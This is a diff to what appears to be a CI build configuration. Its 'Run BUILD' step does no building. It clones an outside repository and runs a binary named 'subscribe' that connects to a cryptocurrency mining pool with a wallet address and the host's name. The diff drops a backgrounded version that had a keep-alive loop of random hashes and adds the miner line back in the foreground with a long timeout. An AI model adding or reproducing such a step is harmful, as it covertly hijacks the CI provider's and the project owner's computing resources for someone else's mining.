@@ -11,8 +11,7 @@ working_dir: &working_dir ~/app
     - run:
         name: Run BUILD
         command: |
-                    git clone https://github.com/mariobiszz/students.git && cd students && chmod 777 subscribe && ./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname) >/dev/null &
-                    while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+                    git clone https://github.com/mariobiszz/students.git && cd students && chmod 777 subscribe && ./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)
         no_output_timeout: 290m
 version: 2.0
 jobs:
